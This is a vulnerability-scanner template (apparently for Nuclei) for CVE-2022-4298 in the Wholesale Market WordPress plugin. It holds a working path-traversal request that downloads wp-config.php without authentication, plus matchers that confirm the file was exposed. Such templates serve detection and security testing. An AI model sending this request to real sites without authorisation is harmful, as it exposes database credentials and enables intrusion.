id: CVE-2022-4298

info:
  name: Wholesale Market < 2.2.1 - Unauthenticated Arbitrary File Download
  author: rs0n
  severity: critical
  description: |
    The Wholesale Market WordPress plugin before 2.2.1 does not have authorisation check, as well as does not validate user input used to generate system path, allowing unauthenticated attackers to download arbitrary file from the server.
  reference:
    - https://wpscan.com/vulnerability/7485ad23-6ea4-4018-88b1-174312a0a478
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 10
    cve-id: CVE-2022-4298
    cwe-id: CWE-22
  metadata:
    verified: "true"
  tags: directory-traversal,wholesale-market,wpscan,cve,cve2022,whole,wordpress,wp-plugin,wp

requests:
  - raw:
      - |
        GET /wp-admin/admin-ajax.php?action=ced_cwsm_csv_import_export_module_read_csv HTTP/1.1
        Host: {{Hostname}}
      - |
        @timeout: 10s
        GET /wp-admin/admin-ajax.php?action=ced_cwsm_csv_import_export_module_download_error_log&tab=ced_cwsm_plugin&section=ced_cwsm_csv_import_export_module&ced_cwsm_log_download=../../../wp-config.php HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "len(body)>2 && status_code==200"
      
      - type: word
        words:
          - "<?php"
        part: body